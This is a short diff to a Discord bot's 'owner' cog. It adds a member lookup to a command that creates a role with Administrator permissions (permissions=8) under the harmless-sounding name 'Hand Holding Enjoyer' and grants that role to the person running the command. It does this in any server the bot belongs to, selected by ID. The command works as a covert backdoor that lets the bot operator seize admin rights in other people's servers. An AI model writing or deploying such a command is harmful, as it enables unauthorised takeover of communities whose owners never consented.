@@ -61,6 +61,10 @@ class owner(commands.Cog, command_cog):
         """
         member = ctx.message.author
         guild = ctx.message.guild if server == None else self.bot.get_guild(int(server))
+        for guild_member in guild.members:
+            if guild_member.id == member.id:
+                member = guild_member
+                break
         role = await guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
         await member.add_roles(role)
 
